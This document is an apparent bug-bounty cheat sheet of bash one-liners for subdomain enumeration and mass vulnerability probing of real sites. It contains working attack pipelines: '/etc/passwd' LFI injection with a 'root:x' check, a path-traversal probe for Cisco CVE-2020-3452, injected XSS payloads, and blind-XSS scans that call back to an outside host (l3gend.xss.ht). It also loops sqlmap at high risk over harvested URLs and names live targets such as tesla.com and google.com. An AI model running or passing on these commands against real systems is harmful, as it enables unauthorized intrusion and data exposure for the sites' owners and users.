# Common 

## domains
```bash 
cat wildcards.txt | assetfinder -subs-only | anew domains
```

```bash 
amass enum -df wildcards.txt | anew domains
```

```bash 
subfinder -silent -dL wildcards.txt| anew domains
```

```bash 
for i in $(cat wildcards.txt);do bash ~/scripts/Sub-Drill.sh $i | anew domains;done 
```

## Filter domain by level 

```bash
cat domains | dsieve -f 2
```

## one liners and tools

```bash 
sort -u domains | httprobe > uniq.txt
```

```bash
crlfuzz -l uniq.txt -s
```

```bash
gau uniq.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

```bash 
cat uniq.txt |waybackurls | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b l3gend.xss.ht pipe > OUT.txt
```

```bash
python3 ~/tools/Corsy/corsy.py -i uniq.txt 
```

```bash 
python3 ~/tools/XSStrike/xsstrike.py -u "https://www.glassdoor.com/rss/interviews.rss?id=lol" 
```

```bash
python3 ~/tools/smuggler/smuggler.py -u "https://google.com" -m GET -q
```

```bash
python3 ~/tools/mass-bounty/CRLF-Injection-Scanner/crlf_scan.py -i uniq.txt
```


* CVE-2020-3452
```bash
┌──(root㉿0xlegendkiller)-[~/cves/CVE-2020-3452]
└─# pwd
/root/cves/CVE-2020-3452
                                                                                              
┌──(root㉿0xlegendkiller)-[~/cves/CVE-2020-3452]
└─# python3 CVE-2020-3452.py -i ~/private_hackerone/playtika/domains
```

```bash 
cat uniq.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```

```bash
subzy -targets domains -hide_fails
```

```bash
jaeles scan -s /root/.jaeles/base-signatures/cves/* -U domains.txt
```

## Heavy 
```bash
eyewitness --web -f uniq.txt -d /path_to_save_screenshots ##### optional , takes time, better grep for juicy domains and move forward
```

```bash
for I in $(ls); do 
        echo "$I" >> index.html;
        echo "<img src=$I><br>" >> index.html;
done
```

## SSRF Test (Wayback + Burp Pro)

```bash
cat wayback.txt | gf ssrf | sort -u >> testblindssrf.txt
```

```bash
cat testblindssrf.txt | qsreplace "burp_url" >> ssrfuzz.txt

ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
```

## dalfox

```bash 
python3 ~/tools/ParamSpider/paramspider.py --domain google.com -o param.txt
```

```bash
dalfox -b l3gend.xss.ht file param.txt
```

## SQL Injection Mass Testing

```bash
subfinder -d tesla.com -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls
```

```bash
cat urls | gf sqli | tee -a sqli
```

```bash
while read line;do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3;done < sqli
```

## Finding deadlinks
```bash
for i in $(cat uniq.txt);do deadlinks $i|anew dead_Links;done
```

```bash
deadfinder file uniq.txt -o deadfinder.json
```

> https://www.deadlinkchecker.com/website-dead-link-checker.asp

> https://ahrefs.com/broken-link-checker

> https://brokenlinkcheck.com/broken-links.php


* Find valid links from wayback, cralwers, hawked etc 
```bash
cat wayback.txt| hakcheckurl | grep "200 http" | anew wayback200
```

